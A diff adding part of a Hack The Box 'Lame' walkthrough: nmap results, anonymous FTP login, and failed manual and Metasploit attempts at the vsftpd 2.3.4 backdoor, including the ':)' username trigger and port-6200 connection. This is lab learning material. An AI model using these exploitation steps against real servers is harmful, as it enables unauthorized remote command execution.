@@ -117,3 +117,148 @@ Host script results:
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 60.94 seconds
 ```
+
+### Results:
+
+```
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 2.3.4
+22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
+445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian
+3632/tcp open  distccd     distccd v1 (GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4)
+```
+
+## FTP Enumeration
+
+The FTP service on port 21 allows anonymous logins, which is a common misconfiguration that can sometimes lead to unauthorized access or information disclosure. However, in this case, the directory accessible via anonymous login is empty.
+
+```
+┌──(kali㉿kali)-[~]
+└─$ ftp 10.10.10.3    
+Connected to 10.10.10.3.
+220 (vsFTPd 2.3.4)
+Name (10.10.10.3:kali): anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||33180|).
+150 Here comes the directory listing.
+226 Directory send OK.
+ftp> 
+```
+
+## Exploiting VSFTPd 2.3.4 Backdoor (CVE-2011-2523)
+
+The VSFTPd version 2.3.4 is infamous for containing a backdoor that allows remote command execution. This backdoor was intentionally inserted into the code and can be exploited under certain conditions. However, in the case of the Lame machine, the backdoor is not remotely exploitable due to firewall restrictions.
+
+```
+┌──(kali㉿kali)-[~]                                                                                                 │
+└─$ searchsploit vsftpd 2.3.4                                                                                       │
+---------------------------------------------------------------------------------- ---------------------------------│
+ Exploit Title                                                                    |  Path                           │
+---------------------------------------------------------------------------------- ---------------------------------│
+vsftpd 2.3.4 - Backdoor Command Execution                                         | unix/remote/49757.py            │
+vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                            | unix/remote/17491.rb            │
+---------------------------------------------------------------------------------- ---------------------------------│
+Shellcodes: No Results
+```
+The output shows a Metasploit module (`exploits/unix/remote/17491.rb`) that can be used to exploit the backdoor.
+
+### Exploit Details
+The backdoor is triggered when a username ending in `:)` is sent during the FTP login process. This causes the server to open a listener on port 6200, which can be used to execute arbitrary commands.
+
+### Manual Exploitation Attempt
+
+1. Trigger the Backdoor:
+   Connect to the FTP server and log in with a username ending in `:)`:
+
+```
+┌──(kali㉿kali)-[~]                                                                                                 
+└─$ nc 10.10.10.3 21                                                                                                
+                                                                                                                    
+220 (vsFTPd 2.3.4)                                                                                                  
+USER n3rdh4x0r:)                                                                                                    
+331 Please specify the password.                                                                                    
+PASS n3rdh4x0r-not-a-password
+```
+
+2. Check for Listener:
+   If the backdoor is successfully triggered, the server will open a listener on port 6200. Attempt to connect to it:
+
+```
+nc 10.10.10.3 6200
+```
+  However, in this case, the connection fails:
+
+```
+┌──(kali㉿kali)-[~]                                                                                                 
+└─$ nc 10.10.10.3 6200
+
+(UNKNOWN) [10.10.10.3] 6200 (?) : Connection timed out
+```
+
+### Metasploit Exploitation Attempt
+
+```
+┌──(kali㉿kali)-[~]
+└─$ sudo msfconsole -q
+[sudo] password for kali: 
+msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
+[*] No payload configured, defaulting to cmd/unix/interact
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.10.10.3
+RHOSTS => 10.10.10.3
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
+
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   CHOST                     no        The local client address
+   CPORT                     no        The local client port
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS   10.10.10.3       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT    21               yes       The target port (TCP)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set payload cmd/unix/interact
+payload => cmd/unix/interact
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
+
+[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
+[*] 10.10.10.3:21 - USER: 331 Please specify the password.
+[*] Exploit completed, but no session was created.
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 
+```
+The exploit fails because the backdoor listener is blocked by the firewall.
+
+### Why the Exploit Fails
+The backdoor listener on port 6200 is not accessible remotely due to firewall rules. This is confirmed by checking the open ports on the machine:
+
+```
+root@lame:/# netstat -tnlp | grep 6200
+tcp        0      0 0.0.0.0:6200            0.0.0.0:*               LISTEN      5580/vsftpd
+
+```
+While the listener is active, it is not reachable from outside the machine.
+
+
+
+
+
+
+
+
